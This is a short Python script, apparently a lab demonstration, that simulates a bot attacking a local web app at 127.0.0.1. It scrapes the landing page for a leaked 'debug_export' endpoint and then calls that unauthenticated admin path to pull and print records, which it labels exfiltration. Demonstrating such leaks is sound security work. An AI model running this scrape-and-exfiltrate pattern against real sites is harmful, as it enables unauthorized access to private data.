"""Simulates an automated bot exploiting the landing-page code leak."""
import re
import urllib.request
import json

BASE = "http://127.0.0.1:5050"

# 1. Scrape landing page for leaked comments/endpoints
html = urllib.request.urlopen(f"{BASE}/").read().decode("utf-8")
match = re.search(r"debug_export=([^\s]+)", html)
if not match:
    raise RuntimeError("No coding gap found on landing page.")

leaked_path = match.group(1)
print(f"[BOT] Discovered leaked endpoint in landing page HTML: {leaked_path}")

# 2. Exploit the leaked admin endpoint to exfiltrate records
resp = urllib.request.urlopen(f"{BASE}{leaked_path}").read().decode("utf-8")
data = json.loads(resp)
print(f"[BOT] Exfiltration complete: {data}")
